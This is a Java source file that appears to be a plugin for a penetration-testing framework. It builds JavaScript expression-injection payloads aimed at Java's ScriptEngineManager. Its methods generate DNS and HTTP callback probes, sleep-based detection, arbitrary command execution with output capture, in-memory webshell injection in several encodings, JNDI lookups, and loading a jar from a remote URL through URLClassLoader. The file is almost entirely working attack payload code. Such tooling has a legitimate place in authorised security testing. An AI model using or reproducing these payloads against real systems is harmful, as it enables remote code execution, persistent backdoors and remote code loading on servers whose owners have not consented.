package me.gv7.woodpecker.plugin.exprs;

import me.gv7.woodpecker.plugin.IExpr;
import me.gv7.woodpecker.plugin.utils.MemShellClassFactory;
import me.gv7.woodpecker.plugin.utils.MemShellJSUtils;
import me.gv7.woodpecker.plugin.utils.Utils;

import static me.gv7.woodpecker.plugin.utils.Utils.escape;

public class ScriptEngineManagerExpr implements IExpr {
    private String _encoder = "none";

    @Override
    public void setEncoder(String encoder) {
        _encoder = encoder;
    }

    private String out(String text) {
        return Utils.encoder(text, _encoder);
    }

    @Override
    public String getName() {
        return "ScriptEngineManager(JS)";
    }

    @Override
    public String[] genDnslog(String domain) {
        return new String[]{
                out("java.net.InetAddress.getByName('" + escape(domain) + "');")
        };
    }

    @Override
    public String[] genHttplog(String url) {
        return new String[]{
                out("new java.net.URL('" + escape(url) + "').getContent();")
        };
    }

    @Override
    public String[] genSleep(int sec) {
        return new String[]{
                out("java.lang.Thread.sleep(" + (sec * 1000) + ");")
        };
    }

    @Override
    public String[] genExec(String command) {
        return new String[]{
                out("java.lang.Runtime.getRuntime().exec(\"" + escape(command, "\"") + "\");")
        };
    }

    @Override
    public String[] genExecWithEcho(String command) {
        return new String[]{
                out("new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"" + escape(command, "\"") + "\").getInputStream()).useDelimiter(\"\\\\A\").next();")
        };
    }

    @Override
    public String[] genMemShell(byte[] memShellClass) {
        try {
            return new String[]{
                    "[+] JS-Unsafe方案：==>" + System.lineSeparator() + out(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.UNSAFE)) + System.lineSeparator() + " <==",
                    "[+] JS-BASE64方案：==>" + System.lineSeparator() + out(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64)) + System.lineSeparator() + " <==",
                    "[+] JS-BigInteger方案：==>" + System.lineSeparator() + out(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER)) + System.lineSeparator() + " <==",
                    "[+] JS-BCEL方案：==>" + System.lineSeparator() + out(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BCEL)) + System.lineSeparator() + " <=="
            };
        } catch (Exception ex) {
            return new String[]{
                    "class文件异常",
                    Utils.getErrDetail(ex)
            };
        }
    }

    @Override
    public String[] genJNDI(String jndiAddress) {
        return new String[]{out("new javax.naming.InitialContext().lookup('" + jndiAddress + "')")};
    }

    @Override
    public String[] genLoadJar(String url, String className) {
        return new String[]{out("var urls = new Array(); urls[0]=new java.net.URL(\"" + url + "\");new java.net.URLClassLoader(urls).loadClass(\"" + className + "\").newInstance()")};
    }
}
